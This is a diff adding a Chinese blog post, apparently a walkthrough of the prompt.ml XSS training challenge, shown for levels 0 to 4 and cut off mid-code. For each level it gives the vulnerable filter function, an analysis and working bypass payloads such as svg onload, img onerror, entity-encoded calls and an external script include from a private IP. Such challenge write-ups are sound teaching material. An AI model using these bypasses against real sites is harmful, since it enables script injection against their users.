@@ -1,0 +1,1231 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#fff">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.4.1" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/fish-32x32.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/fish-16x16.png?v=6.4.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.1" color="#fff">
+
+
+
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.1',
+    sidebar: {"position":"right","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="prompt-xss笔记在线xss题目,用于xss学习,弹出prompt(1)就过关. 地址:http://prompt.ml 文档: https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml 我使用的是firefox浏览器,不同的浏览器有时会有些差异。 Level 0Code:12345function escape(input) &amp;#1">
+<meta name="keywords" content="XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="prompt-xss笔记">
+<meta property="og:url" content="https://yingyingguaier.github.io/2018/10/11/prompt-xss笔记/index.html">
+<meta property="og:site_name" content="0menc&#39;s Blog">
+<meta property="og:description" content="prompt-xss笔记在线xss题目,用于xss学习,弹出prompt(1)就过关. 地址:http://prompt.ml 文档: https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml 我使用的是firefox浏览器,不同的浏览器有时会有些差异。 Level 0Code:12345function escape(input) &amp;#1">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level0_001.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level0_002.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level0_003.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level0_004.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level0_005.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level0_006.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level1_001.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level1_002.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level1_003.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level2_001.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level2_002.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level2_003.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level3_001.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level4_001.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level5_001.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level6_001.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level6_002.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level6_003.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level7_001.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level7_002.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level7_003.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level7_004.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level7_005.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level8_001.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level8_002.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level9_001.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level9_002.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/levelA_001.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/levelB_001.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/levelB_002.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/levelB_003.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/levelC_001.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/levelC_002.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/levelD_001.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/levelD_002.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/levelD_003.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/levelE_001.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/levelE_002.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/levelF_001.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/levelF_002.png">
+<meta property="og:updated_time" content="2019-06-19T17:23:13.384Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="prompt-xss笔记">
+<meta name="twitter:description" content="prompt-xss笔记在线xss题目,用于xss学习,弹出prompt(1)就过关. 地址:http://prompt.ml 文档: https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml 我使用的是firefox浏览器,不同的浏览器有时会有些差异。 Level 0Code:12345function escape(input) &amp;#1">
+<meta name="twitter:image" content="https://yingyingguaier.github.io/img/xss/prompt_ml/level0_001.png">
+
+
+
+
+
+
+  <link rel="canonical" href="https://yingyingguaier.github.io/2018/10/11/prompt-xss笔记/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>prompt-xss笔记 | 0menc's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0menc's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">学习、踩坑及经验分享</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-commonweal">
+    <a href="/404.html" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>Commonweal 404</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yingyingguaier.github.io/2018/10/11/prompt-xss笔记/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="嘤嘤怪er">
+      <meta itemprop="description" content="0menc">
+      <meta itemprop="image" content="/images/jack.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0menc's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">prompt-xss笔记
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-10-11 09:12:00" itemprop="dateCreated datePublished" datetime="2018-10-11T09:12:00+08:00">2018-10-11</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/XSS/" itemprop="url" rel="index"><span itemprop="name">XSS</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="prompt-xss笔记"><a href="#prompt-xss笔记" class="headerlink" title="prompt-xss笔记"></a>prompt-xss笔记</h1><p>在线xss题目,用于xss学习,弹出prompt(1)就过关.</p>
+<p>地址:<a href="http://prompt.ml" target="_blank" rel="noopener">http://prompt.ml</a></p>
+<p>文档: <a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml" target="_blank" rel="noopener">https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml</a></p>
+<p>我使用的是firefox浏览器,不同的浏览器有时会有些差异。</p>
+<h1 id="Level-0"><a href="#Level-0" class="headerlink" title="Level 0"></a>Level 0</h1><h2 id="Code"><a href="#Code" class="headerlink" title="Code:"></a>Code:</h2><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> &#123;</span></span><br><span class="line">    <span class="comment">// warm up</span></span><br><span class="line">    <span class="comment">// script should be executed without user interaction</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input type="</span>text<span class="string">" value="</span><span class="string">' + input + '</span><span class="string">"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h2><p>没有过滤,需要构造闭合。<br>官方文档的答案是<code>&quot;&gt;&lt;svg  onload=prompt(1)&gt;</code>,利用了svg标签的onload事件，<br>而onload 事件会在页面或图像加载完成后立即发生。</p>
+<h2 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions:"></a>Solutions:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1. "&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">2. "&gt;<span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">prompt(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line">3. 利用外联方式 </span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://10.60.250.250/pro.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">4. 利用onerror事件,当src寻找的资源不存在发送错误弹框。</span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">''</span> <span class="attr">onerror</span>=<span class="string">'prompt(1)'</span>&gt;</span></span><br><span class="line"></span><br><span class="line">5. 利用html的字符实体和SVG。</span><br><span class="line">    SVG意为可缩放矢量图形（Scalable Vector Graphics）。</span><br><span class="line">    SVG 使用 XML 格式定义图像。</span><br><span class="line">   "&gt;<span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt&amp;#x28;1&amp;#x29;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"></span><br><span class="line">6. 利用编码</span><br><span class="line">	"&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">"&amp;#x70;&amp;#x72;&amp;#x6f;&amp;#x6d;&amp;#x70;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;"</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Img"><a href="#Img" class="headerlink" title="Img:"></a>Img:</h2><ol>
+<li><code>&quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;</code></li>
+</ol>
+<p><img src="/img/xss/prompt_ml/level0_001.png" alt="0_1"></p>
+<ol start="2">
+<li><code>&quot;&gt;&lt;svg onload=prompt(1)&gt;</code></li>
+</ol>
+<p><img src="/img/xss/prompt_ml/level0_002.png" alt="0_2"></p>
+<ol start="3">
+<li><code>&quot;&gt;&lt;script src=&quot;http://10.60.250.250/pro.js&quot;&gt;&lt;/script&gt;</code></li>
+</ol>
+<p><img src="/img/xss/prompt_ml/level0_003.png" alt="0_3"></p>
+<ol start="4">
+<li><code>&quot;&gt;&lt;img src=&#39;&#39; onerror=&#39;prompt(1)&#39;&gt;</code></li>
+</ol>
+<p><img src="/img/xss/prompt_ml/level0_004.png" alt="0_4"></p>
+<ol start="5">
+<li><code>&quot;&gt;&lt;svg&gt;&lt;script&gt;prompt&amp;#x28;1&amp;#x29;&lt;/script&gt;&lt;/svg&gt;</code></li>
+</ol>
+<p><img src="/img/xss/prompt_ml/level0_005.png" alt="0_5"></p>
+<ol start="6">
+<li><code>&quot;&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;&amp;#x70;&amp;#x72;&amp;#x6f;&amp;#x6d;&amp;#x70;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;</code></li>
+</ol>
+<p><img src="/img/xss/prompt_ml/level0_006.png" alt="0_6"></p>
+<h1 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h1><h2 id="Code-1"><a href="#Code-1" class="headerlink" title="Code:"></a>Code:</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// tags stripping mechanism from ExtJS library</span></span><br><span class="line">    <span class="comment">// Ext.util.Format.stripTags</span></span><br><span class="line">    <span class="keyword">var</span> stripTagsRE = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span>;</span><br><span class="line">    input = input.replace(stripTagsRE, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;article&gt;'</span> + input + <span class="string">'&lt;/article&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析:"></a>分析:</h2><p>过滤了<code>&lt;&gt;</code>,只要用<code>&lt;&gt;</code>闭合就将<code>&lt;xx&gt;</code>全部替换为空。</p>
+<p>可以去掉<code>&gt;</code>来绕过，浏览器在处理没有右尖括号的标签时有兼容性，没有<code>&gt;</code>的标签也能生效。（注意这时候后边不能有内容)。</p>
+<p>可以用//注释或换行分开<code>&lt;/article&gt;</code></p>
+<p>官方答案是<code>&lt;svg/onload=prompt(1)</code>,其实和<code>&lt;svg onload=prompt(1)</code>相同。</p>
+<h2 id="Solutions-1"><a href="#Solutions-1" class="headerlink" title="Solutions:"></a>Solutions:</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> </span><br><span class="line">&lt;img src=# onerror=prompt(<span class="number">1</span>)</span><br><span class="line"><span class="number">123</span> <span class="comment">//(这里的123是为了使img生效)</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> &lt;svg/onload=prompt(<span class="number">1</span>)<span class="comment">// (利用注释过掉&lt;/article&gt;)</span></span><br><span class="line">	或</span><br><span class="line">	&lt;svg onload=prompt(<span class="number">1</span>)<span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 利用onerror事件,当src寻找的资源不存在发送错误弹框。</span><br><span class="line">	&lt;img src='' onerror='prompt(<span class="number">1</span>)'</span><br></pre></td></tr></table></figure>
+
+<h2 id="Img-1"><a href="#Img-1" class="headerlink" title="Img:"></a>Img:</h2><ol>
+<li><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=# <span class="attribute">onerror</span>=prompt(1)</span><br><span class="line">123</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p><img src="/img/xss/prompt_ml/level1_001.png" alt="1_1"></p>
+<ol start="2">
+<li><p><code>&lt;svg/onload=prompt(1)//</code><br><img src="/img/xss/prompt_ml/level1_002.png" alt="1_2"></p>
+</li>
+<li><p><code>&lt;img src=&#39;&#39; onerror=&#39;prompt(1)&#39;</code>或<code>&lt;img src=&#39;&#39; onerror=&#39;prompt(1)&#39; /</code>或<code>&lt;img src=&#39;&#39; onerror=&#39;prompt(1)&#39; //</code></p>
+</li>
+</ol>
+<p><img src="/img/xss/prompt_ml/level1_003.png" alt="1_3"></p>
+<h1 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h1><h2 id="Code-2"><a href="#Code-2" class="headerlink" title="Code:"></a>Code:</h2><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span></span> &#123;</span><br><span class="line">    //                      v<span class="comment">-- frowny face</span></span><br><span class="line">    <span class="built_in">input</span> = <span class="built_in">input</span>.replace(/[=(]/g, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    // ok seriously, disallows equal signs <span class="keyword">and</span> <span class="built_in">open</span> parenthesis</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">input</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">过滤了`=`和`)`</span><br><span class="line">尝试使用编码或其他方式绕过</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solutions-2"><a href="#Solutions-2" class="headerlink" title="Solutions:"></a>Solutions:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.使用html编码,&amp;#x28;或&amp;lpar;替代(</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt&amp;#x28;1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt&amp;lpar;1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">官方答案是`<span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">prompt&amp;#40;1)<span class="tag">&lt;<span class="name">b</span>&gt;</span>`,缩短了字符。用的是&amp;#40是10进制的。</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">2. 官方答案:</span></span><br><span class="line"><span class="handlebars"><span class="xml">	<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>.call<span class="string">`<span class="subst">$&#123;<span class="string">'prompt\x281)'</span>&#125;</span>`</span></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">3. 官方答案:</span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">prompt.call<span class="string">`<span class="subst">$&#123;<span class="number">1</span>&#125;</span>`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Img-2"><a href="#Img-2" class="headerlink" title="Img:"></a>Img:</h2><ol>
+<li><p><code>&lt;svg&gt;&lt;script&gt;prompt&amp;#x28;1)&lt;/script&gt;</code></p>
+</li>
+</ol>
+<p><img src="/img/xss/prompt_ml/level2_001.png" alt="2_1"></p>
+<ol start="2">
+<li><p><code>&lt;script&gt;eval.call`${&#39;prompt\x281)&#39;}`&lt;/script&gt;</code></p>
+<p><img src="/img/xss/prompt_ml/level2_002.png" alt="2_2"></p>
+</li>
+<li><p><code>&lt;script&gt;prompt.call`${1}`&lt;/script&gt;</code><br>  <img src="/img/xss/prompt_ml/level2_003.png" alt="2_3"></p>
+</li>
+</ol>
+<h1 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h1><h2 id="Code-3"><a href="#Code-3" class="headerlink" title="Code:"></a>Code:</h2><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span></span> &#123;</span><br><span class="line">    // filter potential comment <span class="keyword">end</span> delimiters</span><br><span class="line">    <span class="built_in">input</span> = <span class="built_in">input</span>.replace(/-&gt;/g, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    // comment the <span class="built_in">input</span> to avoid script execution</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + <span class="built_in">input</span> + <span class="string">' --&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">过滤了-&gt;并替换成<span class="keyword">_</span></span><br><span class="line">但是除了--&gt;可以闭合注释，--!&gt;也可以。</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solutions-3"><a href="#Solutions-3" class="headerlink" title="Solutions:"></a>Solutions:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.--!&gt;<span class="tag">&lt;<span class="name">svg</span>/ <span class="attr">onload</span>=<span class="string">prompt(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line">2. 官方答案:</span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>.call<span class="string">`<span class="subst">$&#123;<span class="string">'prompt\x281)'</span>&#125;</span>`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">3. 官方答案:</span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">prompt.call<span class="string">`<span class="subst">$&#123;<span class="number">1</span>&#125;</span>`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Img-3"><a href="#Img-3" class="headerlink" title="Img:"></a>Img:</h2><ol>
+<li><code>--!&gt;&lt;svg/ onload=prompt(1)&gt;</code></li>
+</ol>
+<p><img src="/img/xss/prompt_ml/level3_001.png" alt="3_1"></p>
+<h1 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h1><h2 id="Code-4"><a href="#Code-4" class="headerlink" title="Code:"></a>Code:</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// make sure the script belongs to own site</span></span><br><span class="line">    <span class="comment">// sample script: http://prompt.ml/js/test.js</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^(?:https?:)?\/\/prompt\.ml\//i</span>.test(<span class="built_in">decodeURIComponent</span>(input))) &#123;</span><br><span class="line">        <span class="keyword">var</span> script = <span 